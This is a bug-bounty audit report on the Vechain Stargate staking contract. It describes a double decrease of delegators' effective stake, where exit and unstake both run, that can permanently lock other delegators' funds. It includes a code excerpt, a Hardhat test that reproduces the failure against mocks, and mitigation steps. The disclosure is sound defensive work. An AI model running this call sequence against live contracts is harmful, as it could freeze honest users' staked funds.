# 59951 sc high in special cases delegatorseffectivestake may decrease twice and cause staked funds to become locked

* **Submitted on Nov 17th 2025 at 06:29:45 UTC by @shaflow1 for** [**Audit Comp | Vechain | Stargate Hayabusa**](https://immunefi.com/audit-competition/audit-comp-vechain-stargate-hayabusa)
* **Report ID:** #59951
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/tree/main/packages/contracts/contracts/Stargate.sol>
* **Impacts:** Permanent freezing of funds

## Description

### Brief / Intro

The checks for whether `_updatePeriodEffectiveStake` should be called in the `delegate` and `unstake` functions are insufficient. This can cause an NFT's unstaking to potentially call `_updatePeriodEffectiveStake` twice and lead to failures in other NFTs' withdrawals due to insufficient `delegatorsEffectiveStake`, resulting in funds being locked.

### Vulnerability Details

Relevant code (excerpt):

```solidity
        // if the delegation is pending or the validator is exited or unknown
        // decrease the effective stake of the previous validator
        if (
            currentValidatorStatus == VALIDATOR_STATUS_EXITED ||
            delegation.status == DelegationStatus.PENDING
        ) {
            // get the completed periods of the previous validator
            (, , , uint32 oldCompletedPeriods) = $
                .protocolStakerContract
                .getValidationPeriodDetails(delegation.validator);

            // decrease the effective stake of the previous validator
            _updatePeriodEffectiveStake(
                $,
                delegation.validator,
                _tokenId,
                oldCompletedPeriods + 2,
                false // decrease
            );
        }
```

The `_updatePeriodEffectiveStake` function is called to decrease `delegatorsEffectiveStake` in:

* `unstake` and `delegate` when `currentValidatorStatus == VALIDATOR_STATUS_EXITED || delegation.status == DelegationStatus.PENDING`
* `requestDelegationExit` (in other code paths) — so in other cases it is not invoked in `unstake`/`delegate`

The condition `currentValidatorStatus == VALIDATOR_STATUS_EXITED || delegation.status == DelegationStatus.PENDING` does not account for the case where a delegator already called `requestDelegationExit` (which already decreased `delegatorsEffectiveStake`) and afterward the validator transitions to exited status. That sequence can cause `_updatePeriodEffectiveStake` to be invoked again in `unstake`/`delegate` because `currentValidatorStatus == VALIDATOR_STATUS_EXITED`, resulting in a double decrease.

{% stepper %}
{% step %}

### Sequence that causes the double decrease (summary)

* A delegator calls `requestDelegationExit` → this calls `_updatePeriodEffectiveStake` to decrease `delegatorsEffectiveStake`.
* The validator later exits (validator status becomes `EXITED`).
* The delegator then calls `unstake` or `delegate`. Because `currentValidatorStatus == VALIDATOR_STATUS_EXITED`, the code path in `unstake`/`delegate` again calls `_updatePeriodEffectiveStake`, decreasing `delegatorsEffectiveStake` a second time.
* The double decrease can reduce `delegatorsEffectiveStake` below what remaining delegators rely on, causing subsequent exits/unstakes to fail and locking funds.
  {% endstep %}
  {% endstepper %}

### Impact Details

This special-case double decrease can cause `delegatorsEffectiveStake` to be excessively reduced, preventing some delegators from withdrawing their funds. An attacker might exploit this to lock funds or cause denial-of-withdrawals among honest delegators.

### Reference

<https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/blob/e9c0bc9b0f24dc0c44de273181d9a99aaf2c31b0/packages/contracts/contracts/Stargate.sol#L267>

## Proof of Concept

Add this test to the end of `packages/contracts/test/unit/Stargate/Delegation.test.ts` to reproduce the issue:

```rust
    it("Validator Active: two delegations become active, first exits & unstakes successfully, second cannot unstake after validator exit", async () => {

        const levelSpec = await stargateNFTMock.getLevel(LEVEL_ID);
        const requiredVet = levelSpec.vetAmountRequiredToStake;

        tx = await stargateContract.connect(user).stake(LEVEL_ID, { value: requiredVet });
        await tx.wait();
        const tokenId1 = await stargateNFTMock.getCurrentTokenId();
        await stargateContract.connect(user).delegate(tokenId1, validator.address);
        log("\n🎉 NFT1 delegated to validator");
        
        tx = await stargateContract.connect(otherUser).stake(LEVEL_ID, { value: requiredVet });
        await tx.wait();
        const tokenId2 = await stargateNFTMock.getCurrentTokenId();
        await stargateContract.connect(otherUser).delegate(tokenId2, validator.address);
        log("\n🎉 NFT2 delegated to validator");
        
        await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, 2);
        expect(await stargateContract.getDelegationStatus(tokenId1)).to.equal(DELEGATION_STATUS_ACTIVE);
        expect(await stargateContract.getDelegationStatus(tokenId2)).to.equal(DELEGATION_STATUS_ACTIVE);
        log("\n🎉 Both delegations are ACTIVE");
        
        let [,,,oldCompletePeriod] = await protocolStakerMock.getValidationPeriodDetails(validator.address);
        let supply = await stargateContract.getDelegatorsEffectiveStake(validator.address, oldCompletePeriod + BigInt(2));
        console.log("supply before NFT1 requestDelegationExit:" + supply);
        tx = await stargateContract.connect(user).requestDelegationExit(tokenId1);
        await tx.wait();
        expect(await stargateContract.hasRequestedExit(tokenId1)).to.be.true;
        log("\n🎉 NFT1 requested delegation exit");
        [,,,oldCompletePeriod] = await protocolStakerMock.getValidationPeriodDetails(validator.address);
        supply = await stargateContract.getDelegatorsEffectiveStake(validator.address, oldCompletePeriod + BigInt(2));
        console.log("supply after NFT1 requestDelegationExit:" + supply);
        
        await protocolStakerMock.helper__setValidatorStatus(validator.address, VALIDATOR_STATUS_EXITED);
        
        await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, 3);
        [,,,oldCompletePeriod] = await protocolStakerMock.getValidationPeriodDetails(validator.address);
        supply = await stargateContract.getDelegatorsEffectiveStake(validator.address, oldCompletePeriod + BigInt(2));
        console.log("supply before NFT1 unstake:" + supply);

        await stargateContract.connect(user).unstake(tokenId1);
        log("\n🎉 NFT1 unstaked successfully");
        
        [,,,oldCompletePeriod] = await protocolStakerMock.getValidationPeriodDetails(validator.address);
        supply = await stargateContract.getDelegatorsEffectiveStake(validator.address, oldCompletePeriod + BigInt(2));
        console.log("supply after NFT1 unstake:" + supply);

        await expect(
            stargateContract.connect(otherUser).unstake(tokenId2)
        ).to.be.reverted;
        log("\n🎉 NFT2 unstake reverted");
    });
```

Test explanation:

* Two delegator NFTs are active and delegated to the same validator.
* NFT1 calls `requestDelegationExit` (which calls `_updatePeriodEffectiveStake` to reduce effective stake) but does not yet unstake.
* The validator exits afterwards.
* NFT1 calls `unstake`; due to validator status being `EXITED`, `_updatePeriodEffectiveStake` is called again during unstake, causing a double decrease.
* The double decrease can make the effective stake zero, causing NFT2's unstake to revert.

The PoC logs (when running the test) show that during NFT1's unstake the `delegatorsEffectiveStake` is reduced twice.

## Recommended mitigation (summary)

* Ensure `_updatePeriodEffectiveStake` is not called a second time for a delegation that already had its effective stake decreased during `requestDelegationExit`.
* Add and check a flag/state to indicate whether the effective stake has already been decreased for that delegation/period (or refine the condition to avoid double-decrement when delegator previously requested exit).
* Carefully audit all code paths that call `_updatePeriodEffectiveStake` to ensure each delegation/period is decreased exactly once.
